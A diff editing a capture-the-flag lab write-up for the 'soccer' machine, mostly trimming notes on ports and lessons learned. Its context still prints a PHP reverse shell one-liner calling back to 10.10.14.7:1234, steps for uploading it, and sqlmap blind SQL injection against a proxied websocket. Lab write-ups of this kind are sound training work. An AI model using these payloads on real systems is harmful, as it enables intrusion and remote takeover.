@@ -40,17 +40,14 @@ created: 2025-08-21
 
 **📚 Learned:**  
 
-- `Websockets` can also be tested for `SQL` injection. We can automate this process with `sqlmap` and a proxy.
-- Look for all subdomains in the web server's config files. There may be some our fuzzing missed.
-- Always test authenticated functionality.
+- `Websockets` tested for `SQL` injection. We can automate this process with `sqlmap` and a proxy.
 - Don't overlook websites that may look similar.
 
 ----
 
 ## 🌐 Port Scan
 
-- **TCP**: 22, 80, 9091 (unknown, revealed to be a `websocket` in foothold)
-- **UDP**: None
+- **TCP**: 22, 80, 9091
 
 ---
 
@@ -84,7 +81,7 @@ I created a file called `rev.php` with a reverse shell payload from `revshell ph
 <?php $s = stream_socket_client("tcp://10.10.14.7:1234"); proc_open("/bin/sh -i", [0=>$s,1=>$s,2=>$s],$pipes);?>
 ```
 
-I moved to the `tiny/uploads` directory and uploaded a `PHP` reverse shell there, since the permissions on that directory were `0755`. To do this, click Upload and select `rev.php`.
+I moved to the `tiny/uploads` directory and uploaded the file there, since the permissions on that directory were `0755`. To do this, click Upload and select `rev.php`.
 
 ![[Pasted image 20250821154033.png]]
 
@@ -119,7 +116,7 @@ www-data@soccer:~$ cat /etc/passwd
 <SNIP>
 ```
 
-After a lot of enumeration, I decided to check the config files and found this:
+After a lot of enumeration, I found this in `nginx`'s config files':
 
 ```shell
 www-data@soccer:~$ ls /etc/nginx/sites-enabled/
@@ -162,7 +159,7 @@ After logging in I got redirected to `/check`.
 
 It looks like it processes the user input and returns an answer. I couldn't see any communication in the `HTTP` history on `Caido`, so I inspected the source code suspecting `JavaScript`.
 
-And it was `JavaScript`. The script starts a connection to a `websocket` listening on port `9091`, which was the mysterious port from the port scan.
+And it was `JavaScript`. The script starts a connection to a `websocket` listening on port `9091`, which was the unknown port from the port scan.
 
 ![[Pasted image 20250821154956.png]]
 
@@ -242,7 +239,7 @@ except KeyboardInterrupt:
 
 Now we can send parameters to `http://localhost:8081/?id=1` and it will redirect them to the `websocket`.
 
-`sqlmap` found that the `websocket` was vulnerable to blind `SQL` injection. Let's dump it.
+`sqlmap` found that the `websocket` was vulnerable to blind `SQL` injection.
 
 ```shell
 sqlmap -u 'http://localhost:8081/?id=1' --batch
